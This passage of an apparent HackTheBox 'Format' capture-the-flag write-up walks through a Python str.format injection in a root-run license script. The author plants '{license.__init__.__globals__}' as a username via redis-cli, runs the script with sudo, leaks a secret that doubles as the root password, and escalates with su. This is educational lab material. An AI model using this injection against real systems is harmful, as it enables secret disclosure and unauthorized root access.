+</span></span><span class="line"><span class="cl"><span class="n">group</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="s1">&#39;--check&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Check if specified license key is valid&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;license_key&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="s1">&#39;/var/run/redis/redis.sock&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/root/license/secret&#34;</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;microblogsalt123&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="o">.</span><span class="n">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="o">.</span><span class="n">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="n">License</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#provision</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hgetall</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;User does not exist. Please provide valid username.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/root/license/keys&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">user_key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;License key has already been provisioned for this user&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&#34;microblog&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">,</span> <span class="s2">&#34;username&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">,</span> <span class="s2">&#34;first-name&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span><span class="p">,</span> <span class="s2">&#34;last-name&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">{license.license}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Plaintext license key:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;------------------------------------------------------&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Encrypted license key (distribute to customer):&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;------------------------------------------------------&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/root/license/keys&#34;</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">license_keys_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provision</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#deprovision</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">deprovision</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;License key deprovisioning coming soon&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#check</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">check</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">check</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;License key valid! Decrypted value:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;------------------------------------------------------&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;License key invalid&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The &ldquo;misconfiguration&rdquo; is far from obvious, and it is easy to overlook. However, this is where the namesake of the box &ldquo;Format&rdquo; comes into play: the vulnerability lies in how python handles content with the format function from the strings package. You can read more about the vulnerability <a class="link" href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/"  target="_blank" rel="noopener"
+    >here</a>. Within our code, there is a format function for the license_key:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="si">{license.license}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since username is something that we can influence, we will make a username with our payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{license.__init__.__globals__}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>According to the article, this should display a list of all global variables for the python process when license_key is printed. Going through the registration page does not allow for odd characters, but now we can just access the database directly with <code>redis-cli</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">HSET</span> <span class="n">asdf</span> <span class="n">username</span> <span class="p">{</span><span class="n">license</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">}</span> <span class="n">password</span> <span class="n">asdf</span> <span class="n">first</span><span class="o">-</span><span class="n">name</span> <span class="n">asdf</span> <span class="n">last</span><span class="o">-</span><span class="n">name</span> <span class="n">asdf</span> <span class="n">pro</span> <span class="bp">true</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">integer</span><span class="p">)</span> <span class="mi">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can verify the change with another <code>hgetall</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">redis</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span> <span class="n">hgetall</span> <span class="n">asdf</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">1</span><span class="p">)</span> <span class="s2">&#34;username&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">2</span><span class="p">)</span> <span class="s2">&#34;{license.__init__.__globals__}&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;password&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;asdf&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">5</span><span class="p">)</span> <span class="s2">&#34;first-name&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">6</span><span class="p">)</span> <span class="s2">&#34;asdf&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">7</span><span class="p">)</span> <span class="s2">&#34;last-name&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">8</span><span class="p">)</span> <span class="s2">&#34;asdf&#34;</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">9</span><span class="p">)</span> <span class="s2">&#34;pro&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="p">)</span> <span class="s2">&#34;true&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when we execute the license generation for user <code>asdf</code>, the format exploit triggers and all global variables are printed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cooper</span><span class="err">@</span><span class="n">format</span><span class="p">:</span><span class="o">~$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">license</span>  <span class="o">-</span><span class="n">p</span> <span class="n">asdf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Plaintext</span> <span class="n">license</span> <span class="n">key</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">microblog</span><span class="p">{</span><span class="s1">&#39;__name__&#39;</span><span class="p">:</span> <span class="s1">&#39;__main__&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">:</span> <span class="n">None</span><span class="p">,</span> <span class="s1">&#39;__package__&#39;</span><span class="p">:</span> <span class="n">None</span><span class="p">,</span> <span class="s1">&#39;__loader__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">_frozen_importlib_external</span><span class="o">.</span><span class="n">SourceFileLoader</span> <span class="n">object</span> <span class="n">at</span> <span class="mh">0x7fa2f40bfc10</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__spec__&#39;</span><span class="p">:</span> <span class="n">None</span><span class="p">,</span> <span class="s1">&#39;__annotations__&#39;</span><span class="p">:</span> <span class="p">{},</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;builtins&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__file__&#39;</span><span class="p">:</span> <span class="s1">&#39;/usr/bin/license&#39;</span><span class="p">,</span> <span class="s1">&#39;__cached__&#39;</span><span class="p">:</span> <span class="n">None</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;base64&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/lib/python3.9/base64.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;default_backend&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">function</span> <span class="n">default_backend</span> <span class="n">at</span> <span class="mh">0x7fa2f3f12430</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;hashes&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;cryptography.hazmat.primitives.hashes&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/local/lib/python3.9/dist-packages/cryptography/hazmat/primitives/hashes.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;PBKDF2HMAC&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2HMAC&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;Fernet&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;cryptography.fernet.Fernet&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;random&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;random&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/lib/python3.9/random.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;string&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/lib/python3.9/string.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;date&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;datetime.date&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;redis&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;redis&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/local/lib/python3.9/dist-packages/redis/__init__.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;argparse&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;argparse&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/lib/python3.9/argparse.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;os&#39;</span> <span class="n">from</span> <span class="s1">&#39;/usr/lib/python3.9/os.py&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">module</span> <span class="s1">&#39;sys&#39;</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;License&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="s1">&#39;__main__.License&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;parser&#39;</span><span class="p">:</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s1">&#39;license&#39;</span><span class="p">,</span> <span class="n">usage</span><span class="o">=</span><span class="n">None</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s1">&#39;Microblog license key manager&#39;</span><span class="p">,</span> <span class="n">formatter_class</span><span class="o">=&lt;</span><span class="k">class</span> <span class="s1">&#39;argparse.HelpFormatter&#39;</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">conflict_handler</span><span class="o">=</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="n">add_help</span><span class="o">=</span><span class="n">True</span><span class="p">),</span> <span class="s1">&#39;group&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">argparse</span><span class="o">.</span><span class="n">_MutuallyExclusiveGroup</span> <span class="n">object</span> <span class="n">at</span> <span class="mh">0x7fa2f2ab87c0</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;args&#39;</span><span class="p">:</span> <span class="n">Namespace</span><span class="p">(</span><span class="n">provision</span><span class="o">=</span><span class="s1">&#39;asdf&#39;</span><span class="p">,</span> <span class="n">deprovision</span><span class="o">=</span><span class="n">None</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="n">None</span><span class="p">),</span> <span class="s1">&#39;r&#39;</span><span class="p">:</span> <span class="n">Redis</span><span class="o">&lt;</span><span class="n">ConnectionPool</span><span class="o">&lt;</span><span class="n">UnixDomainSocketConnection</span><span class="o">&lt;</span><span class="n">path</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="p">,</span><span class="n">db</span><span class="o">=</span><span class="mi">0</span><span class="o">&gt;&gt;&gt;</span><span class="p">,</span> <span class="s1">&#39;__warningregistry__&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;version&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">},</span> <span class="s1">&#39;secret&#39;</span><span class="p">:</span> <span class="s1">&#39;unCR4ckaBL3Pa$$w0rd&#39;</span><span class="p">,</span> <span class="s1">&#39;secret_encoded&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;unCR4ckaBL3Pa$$w0rd&#39;</span><span class="p">,</span> <span class="s1">&#39;salt&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;microblogsalt123&#39;</span><span class="p">,</span> <span class="s1">&#39;kdf&#39;</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here we can see the secret variable: <code>unCR4ckaBL3Pa$$w0rd</code>. This turns out to be the password for root!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cooper@format:~$ su
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">root@format:/home/cooper# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reflection">Reflection
+</h2><p>The initial vulnerability utilized to set our user account to &ldquo;Pro&rdquo; was something I have never seen before, and very interesting to discover! I liked how the box had a central focus on the redis applications, even to the point where we need to use it three times, each with a different goal and technique. The privilege escalation to root, however, I found to be rather frustratingly inconspicuous. It felt that if someone was unaware of particular python interactions, then there was very little chance to figure it out without external guidance. Moreover, having the secret key also being the root password is weird, a little too much like a CTF challenge.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/arbitrary-file-write/">Arbitrary File Write</a>
+        
+            <a href="/tags/redis/">Redis</a>
+        
+            <a href="/tags/git/">Git</a>
+        
+            <a href="/tags/python/">Python</a>
+        
+            <a href="/tags/ssrf/">SSRF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-appsanity/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-appsanity/Appsanity.0223e51c64a4d8d3b0f0bd1a2973a1bc_hu1968093157442597824.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Appsanity"
+                        
+                        data-hash="md5-AiPlHGSk2NOw8L0aKXOhvA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Appsanity</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-sau/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu4137443262157332936.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Sau"
+                        
+                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Sau</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-pilgrimage/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-pilgrimage/Pilgrimage.a429f8be38cd5289d8586e659edf33e2_hu469812373868972083.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Pilgrimage"
+                        
+                        data-hash="md5-pCn4vjjNUonYWG5lnt8z4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Pilgrimage</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-snoopy/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-snoopy/Snoopy.5080c553490904ae8276fd384797c87a_hu1075791163206326267.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Snoopy"
+                        
+                        data-hash="md5-UIDFU0kJBK6Cdv04R5fIeg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Snoopy</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
